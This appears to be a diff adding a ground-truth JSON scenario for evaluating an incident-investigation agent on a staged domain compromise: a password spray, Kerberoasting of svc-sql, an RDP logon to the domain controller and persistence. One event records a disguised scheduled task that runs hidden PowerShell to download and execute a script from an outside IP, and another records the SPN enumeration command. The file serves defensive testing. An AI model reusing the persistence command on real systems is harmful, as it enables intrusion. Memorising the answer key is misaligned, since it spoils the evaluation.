@@ -1,0 +1,450 @@
+{
+  "schema_version": 2,
+  "scenario_name": "credential-spray-domain-compromise",
+  "scenario_description": "A small engineering firm's domain gets compromised in three linked\nstages: an external credential-spray attack against several employee\naccounts succeeds against one (diane.foster); from her workstation the\nattacker enumerates Kerberoastable service accounts and requests a\nticket for an over-privileged SQL service account (svc-sql, a\npre-existing misconfiguration — it's a member of Domain Admins); after\na realistic offline-cracking delay, the attacker uses the cracked\ncredential to log onto the domain controller directly as svc-sql and\nplants a scheduled task for persistence. Tests whether an agent\ncorrectly separates \"how they got in\" (diane.foster) from \"what they\ndid once in\" (svc-sql) rather than crediting the sprayed account with\nthe lasting compromise.\n",
+  "generated_at": "2024-09-09T13:00:00Z",
+  "observation_profile": "complete",
+  "collection_window": {
+    "start": "2024-09-09T13:00:00Z",
+    "end": "2024-09-10T19:00:00Z"
+  },
+  "source_evidence_status": {
+    "evt-compromise-002": {
+      "windows_security": {
+        "visible": 4
+      }
+    },
+    "evt-escalate-005": {
+      "sysmon": {
+        "visible": 18
+      },
+      "windows_security": {
+        "visible": 13
+      }
+    },
+    "evt-kerberoast-004": {
+      "sysmon": {
+        "visible": 9
+      },
+      "windows_security": {
+        "visible": 3
+      }
+    },
+    "evt-persistence-006": {
+      "windows_security": {
+        "visible": 1
+      }
+    },
+    "evt-recon-003": {
+      "sysmon": {
+        "visible": 9
+      },
+      "windows_security": {
+        "visible": 2
+      }
+    },
+    "evt-spray-001": {
+      "windows_security": {
+        "visible": 6
+      }
+    }
+  },
+  "storyline_steps": [
+    {
+      "storyline_id": "evt-spray-001",
+      "index": 0,
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "External credential-spray attack tries a low-and-slow password against several employee accounts; all fail",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "credential_spray"
+      ]
+    },
+    {
+      "storyline_id": "evt-compromise-002",
+      "index": 1,
+      "actor": "diane.foster",
+      "system": "WS-DFOSTER-01",
+      "activity": "The spray eventually guesses diane.foster's actual password; a distinct successful logon follows from the same external range",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "logon"
+      ]
+    },
+    {
+      "storyline_id": "evt-recon-003",
+      "index": 2,
+      "actor": "diane.foster",
+      "system": "WS-DFOSTER-01",
+      "activity": "Attacker uses the compromised session to enumerate domain accounts with Kerberoastable service principal names",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-kerberoast-004",
+      "index": 3,
+      "actor": "diane.foster",
+      "system": "WS-DFOSTER-01",
+      "activity": "Attacker requests a Kerberos service ticket for svc-sql using explicit alternate credentials, consistent with Kerberoasting tooling, then goes quiet — the ticket is cracked offline over the following hours",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "explicit_credentials"
+      ]
+    },
+    {
+      "storyline_id": "evt-escalate-005",
+      "index": 4,
+      "actor": "svc-sql",
+      "system": "DC-01",
+      "activity": "Roughly 19 hours after the ticket request — consistent with offline cracking, not a normal same-session escalation — the attacker uses the cracked svc-sql credential to log onto the domain controller directly, from diane.foster's own workstation rather than externally",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "rdp_session"
+      ]
+    },
+    {
+      "storyline_id": "evt-persistence-006",
+      "index": 5,
+      "actor": "svc-sql",
+      "system": "DC-01",
+      "activity": "Attacker plants a scheduled task on the domain controller for persistent access, disguised as a routine maintenance task",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "scheduled_task_created"
+      ]
+    }
+  ],
+  "red_herring_steps": [],
+  "intent_reconciliation": {
+    "complete": true,
+    "expected_count": 6,
+    "planned_count": 6,
+    "occurred_count": 6,
+    "observed_count": 6,
+    "missing_intent_ids": [],
+    "unexpected_intent_ids": [],
+    "intents": [
+      {
+        "intent_id": "c72d25cc-a74c-4bf4-9c1b-e7e04d98d480",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-spray-001",
+        "event_type": "credential_spray",
+        "semantic_instance_key": "242004f07a482908f9d44696:0",
+        "authored_time": "+2h05m",
+        "actor": "SYSTEM",
+        "system": "DC-01",
+        "activity": "External credential-spray attack tries a low-and-slow password against several employee accounts; all fail",
+        "planned": true,
+        "action_ids": [
+          "0b51a3b4-67d6-40c4-8edc-e473a237c326",
+          "32c58381-236b-4236-9bbb-0feba67e78de",
+          "47042f9e-d904-498f-89fa-55604c814562",
+          "5139c50e-885d-4738-b1d8-d6cdaa382a6a",
+          "7dced57a-6fc6-42a3-885a-462b2adb4904",
+          "d2b4291e-c220-46d6-8d27-5a728571ac6d"
+        ],
+        "occurrence_ids": [
+          "44fc7ce3-6754-46d1-a1bb-8c0117256ef1",
+          "83c3b13f-2707-44a4-9d21-57e5f0e842d6",
+          "a7c55363-d074-4f99-9004-bca4387eac0a",
+          "aeafd5b5-a051-49bb-9bfd-dea3ac6df417",
+          "c54ad484-329a-453b-a21a-d64475810759",
+          "d39f072f-2ed8-4fa6-811f-65c230c74fef",
+          "d90755e1-ebe0-4f6e-811e-2eec83cf0ecb",
+          "dbed44dc-18b2-4d19-9d8a-6c52f1dbebbc",
+          "f97ca3bc-e950-45a3-95f3-aa9310898d9e"
+        ],
+        "source_status": {
+          "windows_security": {
+            "visible": 6
+          }
+        }
+      },
+      {
+        "intent_id": "66fa2e30-a3bb-45e5-84ee-80a66ecb008e",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-compromise-002",
+        "event_type": "logon",
+        "semantic_instance_key": "268e141d043e6e95f1a0a5d9:0",
+        "authored_time": "+2h16m",
+        "actor": "diane.foster",
+        "system": "WS-DFOSTER-01",
+        "activity": "The spray eventually guesses diane.foster's actual password; a distinct successful logon follows from the same external range",
+        "planned": true,
+        "action_ids": [
+          "10255f58-563b-4ba1-b917-01140abe1439",
+          "ca0307ab-28fb-4c8b-ab92-d54828b2ee24",
+          "f5a25c4d-b3f6-45da-a733-f105223eaff6"
+        ],
+        "occurrence_ids": [
+          "07ed5ac8-7838-4143-896a-a8f0b4992ff9",
+          "28a5880e-9263-400e-a997-f4de3f993e40",
+          "742c5f41-a478-4320-a776-74866e523049",
+          "974340cc-55d5-4967-b45c-164c06592960",
+          "a2fa7897-e125-4fcd-9381-cf0abc93701e"
+        ],
+        "source_status": {
+          "windows_security": {
+            "visible": 4
+          }
+        }
+      },
+      {
+        "intent_id": "48e3597c-7909-459c-94c1-0a09b185f872",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-recon-003",
+        "event_type": "process",
+        "semantic_instance_key": "4aefa4a8560d96cbd888c5b6:0",
+        "authored_time": "+2h22m",
+        "actor": "diane.foster",
+        "system": "WS-DFOSTER-01",
+        "activity": "Attacker uses the compromised session to enumerate domain accounts with Kerberoastable service principal names",
+        "planned": true,
+        "action_ids": [
+          "c9c8c9ae-5941-4903-84d2-7e0f24f88709"
+        ],
+        "occurrence_ids": [
+          "1e482d76-ae16-4606-b684-9e31439dc4f9",
+          "2ba11c4f-a702-402e-b43f-897c75354113",
+          "59e7a467-be80-46a3-a528-c03b3dd33ebb",
+          "7c2fcc32-01f7-41ac-aa6f-0adceab4aeff",
+          "a9411be9-8736-4f3b-8614-139e73b0b0f1",
+          "afe5ca52-d0b1-42ec-b97a-689d6e36728a",
+          "dae5013f-3ad8-4f2c-b680-9902020858d2",
+          "e53f1fde-218b-4575-801b-e4f65122007e"
+        ],
+        "source_status": {
+          "sysmon": {
+            "visible": 8
+          },
+          "windows_security": {
+            "visible": 1
+          }
+        }
+      },
+      {
+        "intent_id": "284f62c9-9cdc-491b-8010-fab998020077",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-kerberoast-004",
+        "event_type": "explicit_credentials",
+        "semantic_instance_key": "298a0f719d89cef1127643cd:0",
+        "authored_time": "+2h27m",
+        "actor": "diane.foster",
+        "system": "WS-DFOSTER-01",
+        "activity": "Attacker requests a Kerberos service ticket for svc-sql using explicit alternate credentials, consistent with Kerberoasting tooling, then goes quiet — the ticket is cracked offline over the following hours",
+        "planned": true,
+        "action_ids": [
+          "5d63d20d-e0ad-42f8-840a-85413569e651",
+          "86b4ef4a-fa24-44a7-b524-951afbe600a2"
+        ],
+        "occurrence_ids": [
+          "180a36ef-d716-4958-a464-df5632e2dbfe",
+          "5a08c31d-d9c3-4a88-8aff-00df1938e442",
+          "5b62032f-3a7d-4ba6-bd33-237599cc144b",
+          "7e5303de-a933-471a-949e-0b7885308aef",
+          "981cd46e-c403-4fb4-a886-5f1ef02706cf",
+          "ab35bdf8-5f73-4aa7-9cc1-0a8d306cbc03",
+          "cad7c183-c893-44b1-b04f-76ce47ef049f",
+          "ce2f4a0f-606d-4bf0-a912-1ec33bc1fe81",
+          "e3c1358a-5b38-4845-a720-80483d9f3303",
+          "e9306090-b6ad-4456-8ce1-5289b0178652"
+        ],
+        "source_status": {
+          "sysmon": {
+            "visible": 9
+          },
+          "windows_security": {
+            "visible": 3
+          }
+        }
+      },
+      {
+        "intent_id": "c3c50326-0647-4bc3-aa92-e9496ab4ac11",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-escalate-005",
+        "event_type": "rdp_session",
+        "semantic_instance_key": "dfdffe63ead69bad4584ad42:0",
+        "authored_time": "+21h40m",
+        "actor": "svc-sql",
+        "system": "DC-01",
+        "activity": "Roughly 19 hours after the ticket request — consistent with offline cracking, not a normal same-session escalation — the attacker uses the cracked svc-sql credential to log onto the domain controller directly, from diane.foster's own workstation rather than externally",
+        "planned": true,
+        "action_ids": [
+          "0456e6d7-496f-4721-b7d2-d7e3f0593ac2",
+          "1cc57e9a-4882-4dcb-838a-4b03f8cadde0",
+          "27a157b3-5c4d-4858-b5f0-0071bb0f0405",
+          "5dc05009-061e-4bd1-80d4-b16a02225ffc",
+          "85181395-5cc0-49d5-8b0d-c835db4e9a4c",
+          "a31ea551-b74c-4894-8086-b9c1110c58e2",
+          "a4d1ddc3-a384-4edc-b75a-8f937213a3f2",
+          "e1012449-aae8-4a05-aa36-fe0e05cdf996",
+          "ed4572b7-d0e5-4e7a-9a8c-0bcd2633c6b2",
+          "f10f369d-2b6b-4b96-bd13-048a6df2ae3c"
+        ],
+        "occurrence_ids": [
+          "09b7d625-d323-4a8f-a067-ac52aa47963a",
+          "0ecb12c6-2b3f-4533-a6e6-53ebcb534e41",
+          "1790021f-a347-442d-91c1-545705db5098",
+          "1daadfd0-f4ea-4a11-a7e6-aa5c28169629",
+          "24296b6c-9012-4558-9152-097ee7949189",
+          "2840521d-159a-4790-ab18-aea053dde56d",
+          "33ab3957-70ab-4a44-a89f-b47fcfa3bc79",
+          "34bcb789-f4e8-4d3f-9de1-b2b46ea7db96",
+          "452ae947-8bb2-446f-8e9f-e6c54e5686e2",
+          "5fffbc4d-edb9-48bc-a35c-4e338c592fce",
+          "63ef8cc2-9292-4a9a-89fe-4b493b04ee46",
+          "6637bb24-aa65-4989-8172-a4b02bf64241",
+          "802d150d-74e9-4531-a53a-fdaf6b3c5c29",
+          "83695fd0-e2a6-4e25-950b-5c3fcee910eb",
+          "a5ab7a3f-b564-4053-bd21-225f27e4c269",
+          "a8398ee7-a1ae-4f51-9433-b0975af468ae",
+          "bdbab940-21b2-46fd-a6b1-e0098b6cd122",
+          "cdbac1b6-957c-4d4b-969a-5c3ba9e31408",
+          "d53fbb9a-6fa1-4873-9ef2-2a99b073b4d0",
+          "d944f579-f4bb-4b1f-8cbd-011d7e514dd0",
+          "e088f571-deca-4263-9ab6-d7c86552410f",
+          "e7b0359b-6697-4b75-a4c8-14b15b5349aa"
+        ],
+        "source_status": {
+          "sysmon": {
+            "visible": 18
+          },
+          "windows_security": {
+            "visible": 13
+          }
+        }
+      },
+      {
+        "intent_id": "5e3f23e5-b991-406b-8d57-c1952f03b9d0",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-persistence-006",
+        "event_type": "scheduled_task_created",
+        "semantic_instance_key": "16a03c0912772d230d2352c2:0",
+        "authored_time": "+21h48m",
+        "actor": "svc-sql",
+        "system": "DC-01",
+        "activity": "Attacker plants a scheduled task on the domain controller for persistent access, disguised as a routine maintenance task",
+        "planned": true,
+        "action_ids": [
+          "42a75a29-dedc-4c54-85c0-c1e5a3ec6475"
+        ],
+        "occurrence_ids": [
+          "57a2c6f3-e57c-4b7d-8b18-969bc161be58"
+        ],
+        "source_status": {
+          "windows_security": {
+            "visible": 1
+          }
+        }
+      }
+    ]
+  },
+  "events": [
+    {
+      "record_id": "evt-compromise-002#0",
+      "kind": "logon",
+      "intent_id": "66fa2e30-a3bb-45e5-84ee-80a66ecb008e",
+      "storyline_id": "evt-compromise-002",
+      "time": "2024-09-09T15:15:52Z",
+      "actor": "diane.foster",
+      "system": "WS-DFOSTER-01",
+      "activity": "The spray eventually guesses diane.foster's actual password; a distinct successful logon follows from the same external range",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "logon_id": "0xe8a8fcd",
+        "source_ip": "185.220.101.44"
+      }
+    },
+    {
+      "record_id": "evt-escalate-005#0",
+      "kind": "rdp_session",
+      "intent_id": "c3c50326-0647-4bc3-aa92-e9496ab4ac11",
+      "storyline_id": "evt-escalate-005",
+      "time": "2024-09-10T10:40:08Z",
+      "actor": "svc-sql",
+      "system": "DC-01",
+      "activity": "Roughly 19 hours after the ticket request — consistent with offline cracking, not a normal same-session escalation — the attacker uses the cracked svc-sql credential to log onto the domain controller directly, from diane.foster's own workstation rather than externally",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.55.20.10",
+        "dst_port": 3389,
+        "uid": "(filtered by sensor placement)"
+      }
+    },
+    {
+      "record_id": "evt-kerberoast-004#0",
+      "kind": "explicit_credentials",
+      "intent_id": "284f62c9-9cdc-491b-8010-fab998020077",
+      "storyline_id": "evt-kerberoast-004",
+      "time": "2024-09-09T15:26:35Z",
+      "actor": "diane.foster",
+      "system": "WS-DFOSTER-01",
+      "activity": "Attacker requests a Kerberos service ticket for svc-sql using explicit alternate credentials, consistent with Kerberoasting tooling, then goes quiet — the ticket is cracked offline over the following hours",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_server": "DC-01",
+        "target_username": "svc-sql"
+      }
+    },
+    {
+      "record_id": "evt-persistence-006#0",
+      "kind": "scheduled_task_created",
+      "intent_id": "5e3f23e5-b991-406b-8d57-c1952f03b9d0",
+      "storyline_id": "evt-persistence-006",
+      "time": "2024-09-10T10:48:19Z",
+      "actor": "svc-sql",
+      "system": "DC-01",
+      "activity": "Attacker plants a scheduled task on the domain controller for persistent access, disguised as a routine maintenance task",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "task_content": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://45.83.221.30/upd.ps1')</Command>\n    </Exec>\n  </Actions>\n</Task>",
+        "task_name": "WindowsDefenderUpdateCheck"
+      }
+    },
+    {
+      "record_id": "evt-recon-003#0",
+      "kind": "process",
+      "intent_id": "48e3597c-7909-459c-94c1-0a09b185f872",
+      "storyline_id": "evt-recon-003",
+      "time": "2024-09-09T15:21:48Z",
+      "actor": "diane.foster",
+      "system": "WS-DFOSTER-01",
+      "activity": "Attacker uses the compromised session to enumerate domain accounts with Kerberoastable service principal names",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -Command Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName,MemberOf",
+        "pid": 4412,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    },
+    {
+      "record_id": "evt-spray-001#0",
+      "kind": "credential_spray",
+      "intent_id": "c72d25cc-a74c-4bf4-9c1b-e7e04d98d480",
+      "storyline_id": "evt-spray-001",
+      "time": "2024-09-09T15:05:12Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "External credential-spray attack tries a low-and-slow password against several employee accounts; all fail",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "attempt_count": 3,
+        "pattern": "spray",
+        "target_accounts": [
+          "mark.chen",
+          "elena.popov",
+          "diane.foster"
+        ]
+      }
+    }
+  ]
+}
